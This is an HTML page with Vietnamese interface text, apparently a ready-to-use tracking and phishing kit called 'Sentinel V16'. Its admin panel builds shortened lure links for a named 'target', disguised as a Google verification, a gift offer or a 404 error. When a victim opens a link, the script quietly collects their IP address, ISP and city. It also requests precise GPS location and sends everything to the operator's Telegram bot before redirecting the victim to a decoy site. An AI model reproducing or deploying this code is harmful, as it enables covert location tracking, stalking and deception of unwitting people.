<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="meta-title">H·ªá th·ªëng x√°c th·ª±c</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .admin-bg { background: #010409; }
        .glass { background: #0d1117; border: 1px solid #30363d; }
        .input-alt { background: #010409; border: 1px solid #30363d; color: #c9d1d9; font-size: 11px; width: 100%; }
        .input-alt:focus { border-color: #58a6ff; outline: none; }
        .link-box { background: #000; color: #58a6ff; font-family: monospace; border: 1px dashed #23416b; }
        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-thumb { background: #30363d; }
    </style>
</head>
<body class="admin-bg text-slate-400 font-sans min-h-screen">

    <div id="v-track" class="flex flex-col items-center justify-center h-screen p-6 text-center">
        <div id="ui-loader" class="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <div id="ui-content">
            <h2 class="text-white text-sm font-bold uppercase tracking-widest">ƒêang k·∫øt n·ªëi m√°y ch·ªß...</h2>
            <p class="text-[10px] text-slate-500 mt-2 italic">Vui l√≤ng ch·ªù x√°c nh·∫≠n b·∫£o m·∫≠t</p>
        </div>
    </div>

    <div id="v-admin" class="hidden p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-slate-800 pb-4">
                <h1 class="text-xl font-black text-white italic tracking-tighter uppercase">Sentinel <span class="text-blue-500">V16</span></h1>
                <button onclick="logout()" class="text-[9px] bg-red-500/10 text-red-500 px-3 py-1.5 rounded border border-red-500/30">LOGOUT</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-5 space-y-4">
                    <div class="glass p-5 rounded-3xl space-y-4 shadow-2xl">
                        <h3 class="text-blue-500 text-[10px] font-black uppercase tracking-widest">1. C·∫•u h√¨nh & Redirect</h3>
                        <div class="grid grid-cols-2 gap-2">
                            <input id="in-tk" type="password" placeholder="Bot Token" class="input-alt p-3 rounded-xl">
                            <input id="in-id" type="text" placeholder="Chat ID" class="input-alt p-3 rounded-xl">
                        </div>
                        <input id="in-redir" type="text" placeholder="Link ƒë√≠ch (VD: https://youtube.com)" class="input-alt p-3 rounded-xl">
                        <div class="flex gap-2">
                            <input id="in-api" type="password" placeholder="Cuttly API Key" class="flex-1 input-alt p-3 rounded-xl">
                            <button onclick="checkAPI()" class="bg-slate-800 px-3 rounded-xl text-[9px] font-bold text-white">CHECK</button>
                        </div>
                        <button onclick="saveC()" class="w-full bg-blue-600 py-3 rounded-xl text-white text-[10px] font-bold uppercase hover:bg-blue-500">L∆ØU C·∫§U H√åNH</button>
                    </div>

                    <div class="glass p-5 rounded-3xl space-y-4">
                        <h3 class="text-green-500 text-[10px] font-black uppercase tracking-widest">2. T·∫†O LINK M·ªöI</h3>
                        <select id="ed-temp" class="input-alt p-3 rounded-xl text-xs uppercase font-bold">
                            <option value="verify">X√°c th·ª±c Google</option>
                            <option value="gift">Nh·∫≠n qu√† t·∫∑ng</option>
                            <option value="error">L·ªói 404</option>
                        </select>
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u (VD: Anh A)" class="input-alt p-3 rounded-xl">
                        
                        <div class="flex gap-2">
                            <button onclick="generateLink(false)" class="flex-1 bg-slate-700 py-3 rounded-xl text-white text-[10px] font-bold uppercase">T·∫°o Link G·ªëc</button>
                            <button onclick="generateLink(true)" class="flex-1 bg-green-700 py-3 rounded-xl text-white text-[10px] font-bold uppercase">Build & R√∫t G·ªçn</button>
                        </div>

                        <div id="box-link" class="hidden p-4 rounded-xl link-box animate-pulse">
                            <p class="text-[8px] text-slate-500 mb-2 uppercase font-bold">K·∫øt qu·∫£ link:</p>
                            <div id="out-link" onclick="copyL(this)" class="text-[10px] break-all cursor-pointer"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-7">
                    <div class="glass rounded-3xl overflow-hidden min-h-[500px]">
                        <div class="p-4 bg-slate-900/30 border-b border-slate-800 flex justify-between">
                            <h3 class="text-white text-[10px] font-black uppercase tracking-widest italic">Intelligence Logs</h3>
                            <button onclick="clearLogs()" class="text-[8px] text-slate-500 hover:text-red-500 font-bold uppercase">X√≥a h·∫øt</button>
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black text-slate-500 uppercase text-[9px]">
                                    <tr>
                                        <th class="p-4">M·ª•c ti√™u</th>
                                        <th class="p-4">IP / ISP</th>
                                        <th class="p-4">V·ªã tr√≠</th>
                                        <th class="p-4 text-right">Action</th>
                                    </tr>
                                </thead>
                                <tbody id="log-table" class="divide-y divide-slate-800/30 text-slate-300"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let cfg = { t: "", i: "", a: "", r: "https://google.com", temp: "verify" };
        const params = new URLSearchParams(window.location.search);

        const templates = {
            verify: { title: "X√°c th·ª±c", html: `<div class="w-10 h-10 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-4 mx-auto"></div><h2 class="text-white text-sm font-bold">X√ÅC MINH DANH T√çNH...</h2>` },
            gift: { title: "Nh·∫≠n qu√†", html: `<div class="text-4xl mb-4">üéÅ</div><h2 class="text-yellow-500 text-sm font-bold">QU√Ä T·∫∂NG TRONG T·∫¶M TAY!</h2>` },
            error: { title: "404 Not Found", html: `<h1 class="text-5xl font-black text-slate-800">404</h1><h2 class="text-slate-500 text-xs mt-2">ƒê∆∞·ªùng d·∫´n kh√¥ng t·ªìn t·∫°i.</h2>` }
        };

        window.onload = () => {
            if (params.has('admin')) {
                if (localStorage.getItem('auth_v16') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('auth_v16', 'true');
                    document.getElementById('v-track').remove();
                    document.getElementById('v-admin').classList.remove('hidden');
                    loadAdmin();
                } else { window.location.search = ""; }
            } else { applyTemplate(); executeTracking(); }
        };

        function applyTemplate() {
            try { const v = params.get('v'); if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
            const t = templates[cfg.temp] || templates.verify;
            document.getElementById('ui-content').innerHTML = t.html;
            document.getElementById('meta-title').innerText = t.title;
        }

        async function executeTracking() {
            const name = params.get('name') || 'GUEST';
            let ipInfo = { ip: 'N/A', isp: 'N/A', city: 'N/A', lat: 0, lon: 0 };
            
            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipInfo = { ip: res.ip, isp: res.org, city: res.city, lat: res.latitude, lon: res.longitude };
                saveLog({ name, ...ipInfo, time: new Date().toLocaleTimeString(), st: 'IP-ONLY' });
                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + name + "</b> truy c·∫≠p\nüåê IP: " + ipInfo.ip + "\nüìç V√πng: " + ipInfo.city)}`);
            } catch(e) {}

            const finish = () => location.replace(cfg.r);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    updateLogStatus(name, 'GPS-OK', lat, lon);
                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + name + "</b> GPS OK\nüìç B·∫£n ƒë·ªì: https://www.google.com/maps?q=$" + lat + "," + lon)}`);
                    finish();
                }, finish, {enableHighAccuracy: true, timeout: 5000});
            } else { finish(); }
            setTimeout(finish, 8000);
        }

        // --- ADMIN FUNCTIONS ---
        function loadAdmin() {
            const saved = localStorage.getItem('cfg_v16');
            if(saved) cfg = JSON.parse(saved);
            document.getElementById('in-tk').value = cfg.t;
            document.getElementById('in-id').value = cfg.i;
            document.getElementById('in-redir').value = cfg.r;
            document.getElementById('in-api').value = cfg.a || "";
            renderLogs();
        }

        function saveC() {
            cfg.t = document.getElementById('in-tk').value;
            cfg.i = document.getElementById('in-id').value;
            cfg.r = document.getElementById('in-redir').value;
            cfg.a = document.getElementById('in-api').value;
            localStorage.setItem('cfg_v16', JSON.stringify(cfg));
            alert("ƒê√£ l∆∞u c·∫•u h√¨nh!");
        }

        async function generateLink(isShort) {
            const name = document.getElementById('in-name').value;
            if(!name) return alert("Vui l√≤ng nh·∫≠p t√™n m·ª•c ti√™u!");
            
            const base = window.location.href.split('?')[0];
            cfg.temp = document.getElementById('ed-temp').value;
            let finalLink = `${base}?name=${encodeURIComponent(name)}&v=${btoa(JSON.stringify(cfg))}`;
            
            const box = document.getElementById('box-link');
            const out = document.getElementById('out-link');
            
            box.classList.remove('hidden');
            out.innerText = "ƒêang x·ª≠ l√Ω...";

            if(isShort && cfg.a) {
                try {
                    const res = await fetch(`https://cutt.ly/api/api.php?key=${cfg.a}&short=${encodeURIComponent(finalLink)}`).then(r => r.json());
                    if(res.url.status === 7) finalLink = res.url.shortLink;
                    else alert("L·ªói Cutt.ly: " + res.url.status + " - V·∫´n hi·ªán link g·ªëc.");
                } catch (e) { alert("Kh√¥ng th·ªÉ k·∫øt n·ªëi API r√∫t g·ªçn!"); }
            }
            
            out.innerText = finalLink;
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('sentinel_logs_v16') || '[]');
            document.getElementById('log-table').innerHTML = logs.map(l => `
                <tr class="hover:bg-blue-500/5 transition-all border-b border-slate-800/30">
                    <td class="p-4"><b class="text-white uppercase">${l.name}</b><br><span class="text-[8px] text-slate-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-slate-600">${l.isp}</span></td>
                    <td class="p-4 text-[10px] text-slate-300">${l.city}</td>
                    <td class="p-4 text-right">
                        <span class="text-[8px] font-black italic ${l.st === 'GPS-OK' ? 'text-green-500' : 'text-yellow-600'}">${l.st}</span><br>
                        <a href="http://google.com/maps?q={l.lat},${l.lon}" target="_blank" class="text-[9px] text-blue-500 underline">VIEW MAP</a>
                    </td>
                </tr>`).join('');
        }

        function saveLog(d) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v16') || '[]');
            logs.unshift(d);
            localStorage.setItem('sentinel_logs_v16', JSON.stringify(logs.slice(0, 100)));
            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
        }

        function updateLogStatus(n, st, lat, lon) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v16') || '[]');
            if(logs.length > 0 && logs[0].name === n) { logs[0].st = st; logs[0].lat = lat; logs[0].lon = lon; }
            localStorage.setItem('sentinel_logs_v16', JSON.stringify(logs));
            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
        }

        async function checkAPI() {
            const res = await fetch(`https://cutt.ly/api/api.php?key=${document.getElementById('in-api').value}&short=https://google.com`).then(r => r.json());
            alert(res.url.status === 7 ? "API Key Ho·∫°t ƒë·ªông!" : "L·ªói API!");
        }

        function clearLogs() { localStorage.removeItem('sentinel_logs_v16'); renderLogs(); }
        function copyL(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy Link!"); }
        function logout() { localStorage.removeItem('auth_v16'); location.reload(); }
    </script>
</body>
</html>
